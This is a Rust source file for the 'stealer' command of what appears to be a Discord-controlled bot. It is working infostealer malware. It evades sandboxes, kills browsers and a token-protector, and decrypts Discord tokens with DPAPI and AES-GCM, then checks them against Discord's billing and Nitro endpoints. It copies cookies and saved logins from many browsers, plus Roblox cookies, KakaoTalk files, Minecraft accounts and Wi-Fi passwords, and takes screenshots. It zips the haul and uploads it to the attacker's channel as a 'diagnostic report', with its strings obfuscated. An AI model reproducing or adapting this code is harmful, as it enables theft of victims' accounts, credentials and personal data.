use crate::commands::*;
use crate::core::http_client::HttpClient;
use anyhow::{Result, Context};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use twilight_model::channel::message::Message;
use walkdir::WalkDir;
use zip::{write::FileOptions, ZipWriter};
use sysinfo::{System, SystemExt, CpuExt, DiskExt, ProcessExt};
use std::os::windows::process::CommandExt;
use gethostname;
use whoami;
use uuid;
use regex::Regex;
use base64::{Engine as _, engine::general_purpose};
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::Aead, KeyInit};
use crate::core::stego_store::{StegoStore, StringCategory};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN};

pub struct StealerCommand;

impl StealerCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Desc, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
    fn s(key: &str) -> String { StegoStore::get(StringCategory::Stealer, key) }
    fn u(key: &str) -> String { StegoStore::get(StringCategory::Url, key) }
}

#[async_trait]
impl BotCommand for StealerCommand {
    fn name(&self) -> &str { Box::leak(Self::c("STEALER_NAME").into_boxed_str()) }
    fn description(&self) -> &str { Box::leak(Self::f("STEALER").into_boxed_str()) }
    fn category(&self) -> &str { Box::leak(Self::s("CAT_SYS").into_boxed_str()) }
    fn usage(&self) -> &str { Box::leak(Self::c("STEALER_USAGE").into_boxed_str()) }
    fn examples(&self) -> &'static [&'static str] { &[".stealer"] }
    fn aliases(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(Self::c("STEALER_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("STEALER_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        let channel_id = msg.channel_id.get();
        
        // 1. Full Anti-Analysis Logic from main.py
        if self.is_analysis_env() {
            let _ = http.create_message(channel_id, &Self::f("STEALER_ANALYSIS")).await;
            return Ok(());
        }

        let _ = http.create_message(channel_id, Self::f("STEALER").as_str()).await;

        let report_id = uuid::Uuid::new_v4().simple().to_string();
        let temp_dir = env::temp_dir().join(Self::s("P_DIAG").replace("{}", &report_id));
        fs::create_dir_all(&temp_dir)?;

        // 2. Kill Browsers to release locks
        self.kill_browsers();

        // 3. Security Protector Killer
        self.kill_protector();

        // 4. Hardware Spec & HWID
        let hwid = self.get_hwid();
        let sys_info = self.perform_analysis(&hwid);
        let _ = fs::write(temp_dir.join(Self::f("STEALER_HARDWARE_FILE")), sys_info);

        // 5. Native/Browser Credentials
        let tokens = self.grab_tokens();
        if !tokens.is_empty() {
            let _ = fs::write(temp_dir.join(Self::f("STEALER_RAW_TOKENS")), tokens.join("\n"));
            let (detailed_info, brief_summary) = self.validate_and_test_tokens(&tokens).await;
            let _ = fs::write(temp_dir.join(Self::f("STEALER_ACC_INFO")), detailed_info);
            let _ = http.create_message(channel_id, &Self::f("STEALER_ACC_FOUND").replace("{}", &brief_summary)).await;
        }

        // 6. Screenshots & Network info
        let _ = http.create_message(channel_id, "`Capturing screens & analyzing network...`").await;
        self.take_screenshot(&temp_dir);
        let net_info = self.get_network_info().await;
        let _ = fs::write(temp_dir.join(Self::f("STEALER_NET_FILE")), net_info);

        // 7. App Data Collection (Kakao, Roblox, All Browsers)
        let _ = http.create_message(channel_id, "`Collecting forensic artifacts...`").await;
        self.collect_kakao(&temp_dir);
        let (roblox_audit, roblox_brief) = self.collect_roblox(&temp_dir).await;
        if !roblox_brief.is_empty() {
            let _ = http.create_message(channel_id, &Self::f("STEALER_ROBLOX_BRIEF").replace("{}", &roblox_brief)).await;
        }
        self.collect_browsers(&temp_dir);
        self.collect_minecraft(&temp_dir);
        self.collect_wifi(&temp_dir);
        self.collect_discord_backups(&temp_dir);

        // 8. Zip and Send
        let zip_name = Self::f("STEALER_ZIP_FMT").replace("{}", &whoami::username()).replace("{}", &report_id);
        let zip_path = env::temp_dir().join(&zip_name);
        match self.zip_and_send(http, channel_id, &temp_dir, &zip_path).await {
            Ok(_) => { let _ = fs::remove_file(&zip_path); }
            Err(e) => { let _ = http.create_message(channel_id, &Self::f("STEALER_UPLOAD_FAIL").replace("{}", &e.to_string())).await; }
        }

        let _ = fs::remove_dir_all(&temp_dir);
        Ok(())
    }
}

impl StealerCommand {
    fn kill_browsers(&self) {
        let mut s = System::new();
        s.refresh_processes();
        let exes = vec![
            Self::s("EXE_CHROME"), Self::s("EXE_EDGE"), Self::s("EXE_BRAVE"), Self::s("EXE_OPERA"), 
            Self::s("EXE_KOMETA"), Self::s("EXE_ORBITUM"), Self::s("EXE_CENT"), Self::s("EXE_7STAR"),
            Self::s("EXE_SPUTNIK"), Self::s("EXE_VIVALDI"), Self::s("EXE_EPIC"), Self::s("EXE_URAN"),
            Self::s("EXE_YANDEX"), Self::s("EXE_IRIDIUM")
        ];
        for p in s.processes().values() {
            let name = p.name().to_lowercase();
            if exes.iter().any(|e| name == e.to_lowercase()) { p.kill(); }
        }
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    fn kill_protector(&self) {
        let roaming = env::var(Self::s("ENV_ROAMING")).unwrap_or_default();
        let path = Path::new(&roaming).join(Self::s("P_PROTECTOR"));
        if !path.exists() { return; }
        let files: Vec<String> = serde_json::from_str(&Self::s("PROTECTOR_FILES")).unwrap_or_default();
        for f in files { let _ = fs::remove_file(path.join(f)); }
    }

    fn collect_minecraft(&self, temp_dir: &Path) {
        let roaming = env::var(Self::s("ENV_ROAMING")).unwrap_or_default();
        let mc_path = Path::new(&roaming).join(Self::s("P_MINECRAFT"));
        if !mc_path.exists() { return; }
        let out_dir = temp_dir.join("Minecraft");
        let _ = fs::create_dir_all(&out_dir);
        for item in [Self::s("MC_ACC"), Self::s("MC_ACC_MS"), Self::s("MC_CACHE"), Self::s("MC_PROFILES")] {
            let src = mc_path.join(&item);
            if src.exists() { let _ = crate::utils::file_ops::manual_copy_file(&src, &out_dir.join(item)); }
        }
    }

    fn collect_wifi(&self, temp_dir: &Path) {
        use std::process::Command;
        let cmd = Self::s("WIFI_CMD");
        let arg_show = Self::s("WIFI_ARG_SHOW");
        let arg_prof = Self::s("WIFI_ARG_PROF");
        let arg_profs = Self::s("WIFI_ARG_PROFS");
        let arg_key = Self::s("WIFI_ARG_KEY");

        if let Ok(o) = Command::new(&cmd).args([arg_show.as_str(), arg_profs.as_str()]).creation_flags(0x08000000).output() {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let mut passwords = String::new();
            for line in stdout.lines() {
                if line.contains(":") {
                    let prof = line.split(":").nth(1).unwrap_or("").trim();
                    if !prof.is_empty() {
                        if let Ok(o2) = Command::new(&cmd).args([arg_show.as_str(), arg_prof.as_str(), prof, arg_key.as_str()]).creation_flags(0x08000000).output() {
                            let s2 = String::from_utf8_lossy(&o2.stdout);
                            for l in s2.lines() {
                                if l.contains(":") && (l.contains("Key Content") || l.contains("키 콘텐츠")) {
                                    let key = l.split(":").nth(1).unwrap_or("").trim();
                                    passwords.push_str(&Self::s("F_WIFI_FMT").replace("{}", prof).replace("{}", key));
                                }
                            }
                        }
                    }
                }
            }
            if !passwords.is_empty() { let _ = fs::write(temp_dir.join(Self::f("STEALER_WIFI_FILE")), passwords); }
        }
    }

    fn collect_discord_backups(&self, temp_dir: &Path) {
        let home = env::var(Self::s("ENV_USERPROFILE")).unwrap_or_default();
        let p = Path::new(&home).join(Self::s("P_DOWNLOADS")).join(Self::s("F_BACKUP_CODES"));
        if p.exists() { let _ = crate::utils::file_ops::manual_copy_file(&p, &temp_dir.join(Self::f("STEALER_BACKUP_FILE"))); }
    }

    async fn validate_and_test_tokens(&self, tokens: &[String]) -> (String, String) {
        let mut report = Self::f("DISCORD_AUDIT_HEADER");
        let mut brief = String::new();
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(20))
            .build()
            .unwrap_or_else(|_| reqwest::Client::new());

        for (i, token) in tokens.iter().enumerate() {
            let mut info = Self::s("F_TOKEN").replace("{}", token);
            
            // 1. Basic User Info
            if let Ok(resp) = client.get(Self::s("URL_ME").as_str())
                .header("Authorization", token)
                .send().await {
                if resp.status().is_success() {
                    if let Ok(json) = resp.json::<serde_json::Value>().await {
                        let user = format!("{}#{}", json["username"].as_str().unwrap_or("Unknown"), json["discriminator"].as_str().unwrap_or("0000"));
                        let email = json["email"].as_str().unwrap_or("N/A");
                        let phone = json["phone"].as_str().unwrap_or("N/A");
                        let mfa = json["mfa_enabled"].as_bool().unwrap_or(false);
                        
                        info.push_str(&Self::s("F_USER").replace("{}", &user));
                        info.push_str(&Self::s("F_EMAIL").replace("{}", &email));
                        info.push_str(&Self::s("F_PHONE").replace("{}", &phone));
                        info.push_str(&Self::s("F_MFA").replace("{}", &mfa.to_string()));

                        let mut secondary = Vec::new();

                        // 2. Billing Info
                        if let Ok(bill_resp) = client.get(Self::s("URL_BILLING").as_str())
                            .header("Authorization", token)
                            .send().await {
                            if bill_resp.status().is_success() {
                                secondary.push(Self::s("F_BILLING_TAG"));
                                info.push_str(Self::s("F_BILLING").as_str());
                            }
                        }

                        // 3. Nitro Status
                        if let Ok(nitro_resp) = client.get(Self::s("URL_NITRO").as_str())
                            .header("Authorization", token)
                            .send().await {
                            if nitro_resp.status().is_success() {
                                secondary.push(Self::s("F_NITRO_TAG"));
                                info.push_str(Self::s("F_NITRO").as_str());
                            }
                        }

                        brief.push_str(&format!("{}. `{}` ({}) {}\n", i+1, user, email, secondary.join(", ")));
                    }
                } else {
                    info.push_str(Self::s("F_BADK").as_str());
                }
            }
            report.push_str(&format!("{}{}", info, Self::s("F_SEP")));
        }
        (report, brief)
    }

    fn is_analysis_env(&self) -> bool {
        let mut s = System::new_all();
        s.refresh_all();
        
        // 1. Specification Check
        let ram_gb = s.total_memory() / 1024 / 1024 / 1024;
        let cpu_cores = s.cpus().len();
        let disk_gb = s.disks().iter().map(|d| d.total_space()).max().unwrap_or(0) / 1024 / 1024 / 1024;
        
        if ram_gb <= 3 || cpu_cores <= 1 || disk_gb <= 50 { return true; }

        // 2. Blacklist Check (Users, PC Names, HWIDs)
        let victim = whoami::username().to_lowercase();
        let pc_name = gethostname::gethostname().to_string_lossy().to_lowercase();
        let hwid = self.get_hwid().to_lowercase();

        let black_users: Vec<String> = serde_json::from_str(&Self::s("BLACK_USERS")).unwrap_or_default();
        let black_pcs: Vec<String> = serde_json::from_str(&Self::s("BLACK_PCS")).unwrap_or_default();
        let black_hwids: Vec<String> = serde_json::from_str(&Self::s("BLACK_HWIDS")).unwrap_or_default();

        if black_users.contains(&victim) || black_pcs.contains(&pc_name) || black_hwids.contains(&hwid) {
            return true;
        }

        // 3. Analysis Path Check
        let analyze_paths: Vec<String> = serde_json::from_str(&Self::s("BLACK_PATHS")).unwrap_or_default();
        for path in analyze_paths {
            if Path::new(&path).exists() { return true; }
        }

        false
    }

    fn get_hwid(&self) -> String {
        use winreg::enums::*;
        use winreg::RegKey;
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        hklm.open_subkey(Self::f("REG_CRYPTO").as_str())
            .and_then(|key| key.get_value::<String, &str>(Self::f("REG_MGUID").as_str()))
            .unwrap_or_else(|_| "Unknown-HWID".to_string())
    }

    fn decrypt_dpapi(&self, data: &[u8]) -> Result<Vec<u8>> {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut _,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();
        unsafe {
            CryptUnprotectData(&mut input, None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, &mut output)
                .map_err(|e| anyhow::anyhow!("DPAPI Decryption failed: {}", e))?;
            
            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            let _ = winapi::um::winbase::LocalFree(output.pbData as _);
            Ok(result)
        }
    }

    fn grab_tokens(&self) -> Vec<String> {
        let appdata = env::var(Self::s("ENV_LOCAL")).unwrap_or_default();
        let roaming = env::var(Self::s("ENV_ROAMING")).unwrap_or_default();
        let mut tokens = Vec::new();

        let paths = vec![
            (Self::s("P_DISCORD"), Path::new(&roaming).join(Self::s("P_DISCORD")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_CANARY"), Path::new(&roaming).join(Self::s("P_CANARY")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_PTB"), Path::new(&roaming).join(Self::s("P_PTB")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_CHROME"), Path::new(&appdata).join(Self::s("P_GOOGLE")).join(Self::s("P_CHROME")).join(Self::s("P_USER_DATA")).join(Self::s("P_DEFAULT")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_EDGE"), Path::new(&appdata).join(Self::s("P_MS")).join(Self::s("P_EDGE")).join(Self::s("P_USER_DATA")).join(Self::s("P_DEFAULT")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_BRAVE_BROWSER"), Path::new(&appdata).join(Self::s("P_BRAVE_SOFT")).join(Self::s("P_BRAVE_BROWSER")).join(Self::s("P_USER_DATA")).join(Self::s("P_DEFAULT")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
            (Self::s("P_OPERA_SOFT"), Path::new(&roaming).join(Self::s("P_OPERA_SOFT")).join(Self::s("P_OPERA_STABLE")).join(Self::s("P_LOCAL_STORAGE")).join(Self::s("P_LEVELDB"))),
        ];

        let token_re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
        let enc_token_re = Regex::new(r#"dQw4w9WgXcQ:[^"]*"#).unwrap();

        for (name, path) in paths {
            if !path.exists() { continue; }

            let mut master_key = None;
            if name.to_lowercase().contains("cord") {
                let local_state_path = path.parent().unwrap().parent().unwrap().join(Self::s("P_LOCAL_STATE"));
                if local_state_path.exists() {
                    if let Ok(content) = fs::read_to_string(&local_state_path) {
                        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                            if let Some(enc_key) = json[Self::s("OS_CRYPT")][Self::s("ENC_KEY")].as_str() {
                                if let Ok(decoded_key) = general_purpose::STANDARD.decode(enc_key) {
                                    if decoded_key.starts_with(Self::s("DPAPI_PFX").as_bytes()) {
                                        if let Ok(decrypted_key) = self.decrypt_dpapi(&decoded_key[5..]) {
                                            master_key = Some(decrypted_key);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if let Ok(entries) = fs::read_dir(path) {
                for entry in entries.filter_map(|e| e.ok()) {
                    let fname_os = entry.file_name();
                    let fname = fname_os.to_string_lossy();
                    if fname.ends_with(&Self::s("EXT_LOG")) || fname.ends_with(&Self::s("EXT_LDB")) {
                        if let Ok(content) = fs::read(entry.path()) {
                            let text = String::from_utf8_lossy(&content);
                            
                            // Normal Tokens
                            for cap in token_re.captures_iter(&text) {
                                let token = cap[0].to_string();
                                if !tokens.contains(&token) { tokens.push(token); }
                            }

                            // Encrypted Tokens (Discord)
                            if let Some(ref key) = master_key {
                                for cap in enc_token_re.captures_iter(&text) {
                                    let enc_part = &cap[0][Self::s("DISCORD_PFX").len()..];
                                    if let Ok(decoded) = general_purpose::STANDARD.decode(enc_part) {
                                        if let Ok(dec_token) = self.decrypt_aes_gcm(&decoded, key) {
                                            if !tokens.contains(&dec_token) { tokens.push(dec_token); }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        tokens
    }

    fn decrypt_aes_gcm(&self, data: &[u8], master_key: &[u8]) -> Result<String> {
        if data.len() < 15 { return Err(anyhow::anyhow!("Invalid GCM data length")); }
        let iv = &data[3..15];
        let payload = &data[15..];
        
        let key_init = Key::<Aes256Gcm>::from_slice(master_key);
        let cipher = Aes256Gcm::new(key_init);
        let nonce = Nonce::from_slice(iv);
        
        let decrypted = cipher.decrypt(nonce, payload)
            .map_err(|e| anyhow::anyhow!("AES decryption failed: {}", e))?;
        
        Ok(String::from_utf8_lossy(&decrypted).to_string())
    }

    fn take_screenshot(&self, output_dir: &Path) {
        use screenshots::Screen;
        if let Ok(screens) = Screen::all() {
            for (i, screen) in screens.iter().enumerate() {
                if let Ok(image) = screen.capture() {
                    let w = image.width();
                    let h = image.height();
                    let raw = image.buffer();

                    // Detect if it's already a PNG
                    if raw.len() > 8 && &raw[0..4] == &[0x89, 0x50, 0x4E, 0x47] {
                        let _ = fs::write(output_dir.join(Self::s("FILE_SS_FMT").replace("{}", &i.to_string())), raw);
                        continue;
                    }

                    let color_type = if raw.len() == (w * h * 4) as usize {
                        image::ColorType::Rgba8
                    } else if raw.len() == (w * h * 3) as usize {
                        image::ColorType::Rgb8
                    } else {
                        continue;
                    };

                    let mut png_buffer = std::io::Cursor::new(Vec::new());
                    if image::write_buffer_with_format(&mut png_buffer, raw, w, h, color_type, image::ImageFormat::Png).is_ok() {
                        let _ = fs::write(output_dir.join(Self::s("FILE_SS_FMT").replace("{}", &i.to_string())), png_buffer.into_inner());
                    }
                }
            }
        }
    }

    async fn get_network_info(&self) -> String {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()
            .unwrap_or_else(|_| reqwest::Client::new());

        let urls = vec![
            Self::u("IP_API"),
            Self::u("IPIFY"),
            Self::u("ICANHAZIP"),
            Self::u("IDENT_ME"),
            Self::u("IFCONFIG_ME_IP"),
        ];

        for url in urls {
            if url.is_empty() { continue; }
            if let Ok(resp) = client.get(&url).send().await {
                if let Ok(text) = resp.text().await {
                    let ip = text.trim();
                    if !ip.is_empty() {
                        return Self::f("NET_TRACE").replace("{}", ip);
                    }
                }
            }
        }
        Self::f("NET_FAIL")
    }

    fn perform_analysis(&self, hwid: &str) -> String {
        use std::process::Command;
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut report = Self::f("DIAG_HEADER");
        report.push_str(&Self::f("ID_LBL").replace("{}", hwid));
        report.push_str(&Self::f("HOST_LBL").replace("{}", &gethostname::gethostname().to_string_lossy()));
        report.push_str(&Self::f("USER_LBL").replace("{}", &whoami::username()));
        report.push_str(&Self::f("OS_LBL").replace("{}", &whoami::distro().to_string()).replace("{}", &whoami::arch().to_string()));
        let ram_gb = sys.total_memory() / 1024 / 1024 / 1024;
        report.push_str(&Self::f("RAM_LBL").replace("{}", &ram_gb.to_string()));

        report.push_str(Self::f("CPU_HEADER").as_str());
        report.push_str(&Self::f("CORES_LBL").replace("{}", &sys.cpus().len().to_string()));
        
        let mut cpu_name = String::new();
        if let Some(cpu) = sys.cpus().first() { cpu_name = cpu.brand().to_string(); }
        if cpu_name.trim().is_empty() {
            if let Ok(output) = Command::new("powershell").args(["-Command", "Get-WmiObject -Class Win32_Processor | Select-Object Name | Format-List"]).creation_flags(0x08000000).output() {
                let res = String::from_utf8_lossy(&output.stdout);
                for line in res.lines() { if line.trim().starts_with("Name") && line.contains(':') { cpu_name = line.split(':').nth(1).unwrap_or("").trim().to_string(); break; } }
            }
        }
        report.push_str(&Self::f("MODEL_LBL").replace("{}", if cpu_name.is_empty() { "Unknown CPU" } else { &cpu_name }));

        let mut gpu_name = "Unknown GPU".to_string();
        if let Ok(output) = Command::new("powershell").args(["-Command", "Get-WmiObject -Class Win32_VideoController | Select-Object Name | Format-List"]).creation_flags(0x08000000).output() {
            let res = String::from_utf8_lossy(&output.stdout);
            for line in res.lines() { if line.trim().starts_with("Name") && line.contains(':') { gpu_name = line.split(':').nth(1).unwrap_or("").trim().to_string(); break; } }
        }
        report.push_str(&format!("\nGPU: {}\n", gpu_name));

        report.push_str(Self::f("STORAGE_HEADER").as_str());
        for disk in sys.disks() {
            report.push_str(&Self::f("STORAGE_FMT")
                .replace("{:?}", &format!("{:?}", disk.mount_point()))
                .replace("{:.1}", &format!("{:.1}", disk.available_space() as f64 / 1024.0 / 1024.0 / 1024.0))
                .replace("{:.1}", &format!("{:.1}", disk.total_space() as f64 / 1024.0 / 1024.0 / 1024.0)));
        }
        report
    }

    fn collect_kakao(&self, output_dir: &Path) {
        let appdata_local = env::var(Self::s("ENV_LOCAL")).unwrap_or_default();
        if appdata_local.is_empty() { return; }
        let kakao_base = Path::new(&appdata_local).join(Self::s("KAKAO_DIR")).join(Self::s("KAKAO_TALK")).join(Self::s("KAKAO_USERS"));
        if !kakao_base.exists() { return; }
        let out_kakao = output_dir.join(Self::s("DIR_MESSENGER")).join(Self::s("KAKAO_TALK"));
        let _ = fs::create_dir_all(&out_kakao);
        for target in [Self::s("KAKAO_DAT1"), Self::s("KAKAO_DAT2")] {
            let src = kakao_base.join(&target);
            if src.exists() { let _ = crate::utils::file_ops::manual_copy_file(&src, &out_kakao.join(target)); }
        }
    }

    fn collect_browsers(&self, output_dir: &Path) {
        let appdata_local = env::var(Self::s("ENV_LOCAL")).unwrap_or_default();
        let appdata_roaming = env::var(Self::s("ENV_ROAMING")).unwrap_or_default();
        let browser_configs = vec![
            (Self::s("P_CHROME"), Path::new(&appdata_local).join(Self::s("P_GOOGLE")).join(Self::s("P_CHROME")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_EDGE"), Path::new(&appdata_local).join(Self::s("P_MS")).join(Self::s("P_EDGE")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_BRAVE_BROWSER"), Path::new(&appdata_local).join(Self::s("P_BRAVE_SOFT")).join(Self::s("P_BRAVE_BROWSER")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_OPERA_SOFT"), Path::new(&appdata_roaming).join(Self::s("P_OPERA_SOFT")).join(Self::s("P_OPERA_STABLE"))),
            (Self::s("P_OPERA_GX"), Path::new(&appdata_roaming).join(Self::s("P_OPERA_SOFT")).join(Self::s("P_OPERA_GX"))),
            (Self::s("P_KOMETA"), Path::new(&appdata_local).join(Self::s("P_KOMETA")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_ORBITUM"), Path::new(&appdata_local).join(Self::s("P_ORBITUM")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_CENT"), Path::new(&appdata_local).join(Self::s("P_CENT")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_7STAR"), Path::new(&appdata_local).join(Self::s("P_7STAR")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_SPUTNIK"), Path::new(&appdata_local).join(Self::s("P_SPUTNIK")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_VIVALDI"), Path::new(&appdata_local).join(Self::s("P_VIVALDI")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_CHROME_SXS"), Path::new(&appdata_local).join(Self::s("P_CHROME_SXS")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_EPIC"), Path::new(&appdata_local).join(Self::s("P_EPIC")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_URAN"), Path::new(&appdata_local).join(Self::s("P_URAN")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_YANDEX"), Path::new(&appdata_local).join(Self::s("P_YANDEX")).join(Self::s("P_USER_DATA"))),
            (Self::s("P_IRIDIUM"), Path::new(&appdata_local).join(Self::s("P_IRIDIUM")).join(Self::s("P_USER_DATA"))),
        ];
        let out_browsers = output_dir.join(Self::s("DIR_BROWSERS"));
        for (name, path) in browser_configs {
            if !path.exists() { continue; }
            let browser_out = out_browsers.join(name);
            let _ = fs::create_dir_all(&browser_out);
            let local_state = path.join(Self::s("P_LOCAL_STATE"));
            if local_state.exists() { let _ = crate::utils::file_ops::manual_copy_file(&local_state, &browser_out.join(Self::s("P_LOCAL_STATE"))); }
            for p_name in [Self::s("P_DEFAULT"), "Profile 1".to_string(), "Profile 2".to_string(), "Profile 3".to_string(), "Profile 4".to_string(), "Profile 5".to_string(), ".".to_string()] {
                let p_path = if p_name == "." { path.clone() } else { path.join(&p_name) };
                if !p_path.exists() { continue; }
                let p_out = browser_out.join(p_name.replace(" ", "_"));
                let _ = fs::create_dir_all(&p_out);
                for file in [p_path.join(Self::s("P_NETWORK")).join(Self::s("P_COOKIES")), p_path.join(Self::s("P_LOGIN_DATA"))] {
                    if file.exists() { let _ = crate::utils::file_ops::manual_copy_file(&file, &p_out.join(file.file_name().unwrap())); }
                }
            }
        }
    }

    async fn collect_roblox(&self, output_dir: &Path) -> (String, String) {
        let mut report = Self::f("ROBLOX_AUDIT_HEADER");
        let mut brief = String::new();
        let mut cookies = Vec::new();

        // 1. Registry Sweep (HKLM & HKCU)
        use winreg::enums::*;
        use winreg::RegKey;
        for predef in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
            let base = RegKey::predef(predef);
            if let Ok(key) = base.open_subkey(Self::f("ROBLOX_REG_KEY").as_str()) {
                if let Ok(val) = key.get_value::<String, &str>(Self::s("ROBLOX_SEC").as_str()) {
                    if !cookies.contains(&val) { cookies.push(val); }
                }
            }
        }

        // 2. Client File Extraction (%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat)
        let local_appdata = env::var(Self::s("ENV_LOCAL")).unwrap_or_default();
        let roblox_path = Path::new(&local_appdata).join(Self::s("ROBLOX_DIR")).join(Self::s("ROBLOX_LS")).join(Self::s("ROBLOX_FILE"));
        if roblox_path.exists() {
            if let Ok(content) = fs::read_to_string(&roblox_path) {
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                    if let Some(enc_key) = json[Self::s("ROBLOX_KEY")].as_str() {
                        if let Ok(decoded) = general_purpose::STANDARD.decode(enc_key) {
                            if let Ok(decrypted) = self.decrypt_dpapi(&decoded) {
                                let cookie_str = String::from_utf8_lossy(&decrypted).to_string();
                                if !cookies.contains(&cookie_str) { cookies.push(cookie_str); }
                            }
                        }
                    }
                }
            }
        }

        // 3. Validation & Testing
        if cookies.is_empty() {
            report.push_str(Self::f("ROBLOX_NONE").as_str());
        } else {
            let client = reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(15))
                .build()
                .unwrap_or_else(|_| reqwest::Client::new());
            for (i, cookie) in cookies.iter().enumerate() {
                let mut info = Self::s("F_ROBLOX_COOKIE").replace("{}", cookie);
                
                // Roblox API Test
                if let Ok(resp) = client.get(Self::s("URL_ROBLOX").as_str())
                    .header("Cookie", format!("{}={}", Self::s("ROBLOX_SEC"), cookie))
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                    .send().await {
                    if resp.status().is_success() {
                        if let Ok(json) = resp.json::<serde_json::Value>().await {
                            let user = json[Self::s("JSON_USER")].as_str().unwrap_or("Unknown");
                            let robux = json[Self::s("JSON_ROBUX")].as_u64().unwrap_or(0);
                            let premium = json[Self::s("JSON_PREM")].as_bool().unwrap_or(false);
                            info.push_str(&Self::s("F_ROBLOX_VALID").replace("{}", user).replace("{}", &robux.to_string()).replace("{}", &premium.to_string()));
                            brief.push_str(&Self::f("ROBLOX_BRIEF_FMT").replace("{}.", &format!("{}.", i+1)).replace("{}", user).replace("{}", &robux.to_string()).replace("{}", &premium.to_string()));
                        }
                    } else {
                        info.push_str(Self::s("F_ROBLOX_INVALID").as_str());
                    }
                }
                report.push_str(&format!("{}{}", info, Self::s("F_SEP")));
            }
        }

        let _ = fs::write(output_dir.join(Self::f("ROBLOX_AUDIT_FILE")), &report);
        (report, brief)
    }

    async fn zip_and_send(&self, http: &Arc<HttpClient>, channel_id: u64, source: &Path, zip_path: &Path) -> Result<()> {
        let file = fs::File::create(zip_path)?;
        let mut zip = ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
        let mut file_count = 0;
        for entry in WalkDir::new(source).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() {
                let name = path.strip_prefix(source)?.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let mut f = fs::File::open(path)?;
                let mut buffer = Vec::new();
                f.read_to_end(&mut buffer)?;
                zip.write_all(&buffer)?;
                file_count += 1;
            }
        }
        zip.finish()?;
        let data = fs::read(zip_path)?;
        let summary = format!("✅ **Diagnostic Report Generated**\n- **Device**: `{}`\n- **Items Extracted**: `{}`\n- **Size**: `{:.2} MB`", whoami::username(), file_count, data.len() as f64 / (1024.0 * 1024.0));
        http.create_message_with_file(channel_id, &summary, &data, "diagnostic_report.zip").await?;
        Ok(())
    }
}
